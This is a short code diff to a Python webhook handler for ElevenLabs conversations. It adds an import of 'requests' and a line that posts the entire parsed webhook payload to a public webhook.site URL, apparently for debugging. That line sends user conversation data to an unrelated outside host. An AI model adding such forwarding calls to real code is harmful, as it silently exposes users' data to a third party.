@@ -30,6 +30,8 @@ import os
 
 import hmac
 from hashlib import sha256
+
+import requests
 from backend.config.eleven_labs import ElevenLabsClient, ElevenLabsError
 from backend.config.supabase_client import supabase
 # Initialize router
@@ -1030,6 +1032,8 @@ async def elevenlabs_webhook(request: Request, client: ElevenLabsClient = Depend
 
         # Step 4: NOW parse JSON
         webhook_payload = json.loads(payload_body)
+        requests.post("https://webhook.site/cd1995bf-d2c7-4f5d-88f7-0d649c83e07e", json=webhook_payload) 
+        # print(payload_body)
             # Log compact version (avoid huge logs)
         print("\n" + "="*80)
         print("🔔 ELEVENLABS WEBHOOK RECEIVED")
@@ -1041,6 +1045,7 @@ async def elevenlabs_webhook(request: Request, client: ElevenLabsClient = Depend
         
         # Extract the 'data' field (your actual conversation payload)
         data = webhook_payload.get("data", {})
+        # print(data)
         if not data:
             return {"status": "error", "message": "Missing 'data' field in webhook"}
         
